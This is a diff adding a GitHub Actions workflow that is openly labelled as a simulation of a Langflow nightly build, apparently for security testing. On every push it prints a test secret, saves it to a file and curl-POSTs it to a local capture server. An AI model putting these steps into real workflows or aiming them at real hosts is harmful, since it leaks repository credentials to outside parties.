@@ -1,0 +1,33 @@
+# Generated simulated workflow
+# Source file: .github_workflows_release_nightly.yml
+# Orig. workflow name: Langflow Nightly Build
+# WARNING: simulation only — uses TEST_SECRET factice and posts to local capture server.
+name: Langflow Nightly Build - Simulation
+
+on:
+  push:
+    branches: ["**"]
+
+jobs:
+  langflow-nightly-build_sim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Show dummy secret (safe)
+        run: |
+          echo "Simulation from Langflow Nightly Build"
+          echo "TEST_SECRET=${{ secrets.TEST_SECRET }}"
+
+      - name: Save secret to file (simulate leak)
+        run: |
+          printf "%s" "${{ secrets.TEST_SECRET }}" > leaked_secret.txt
+          echo "secret saved to leaked_secret.txt"
+
+      - name: Exfiltrate to local capture (simulation)
+        run: |
+          # Post to host.docker.internal (works in many Docker/act setups) then localhost
+          curl -sS -X POST -H "Content-Type: text/plain" --data-binary @leaked_secret.txt http://host.docker.internal:5000/collect \
+            || curl -sS -X POST -H "Content-Type: text/plain" --data-binary @leaked_secret.txt http://localhost:5000/collect \
+            || echo "Simulation POST failed"
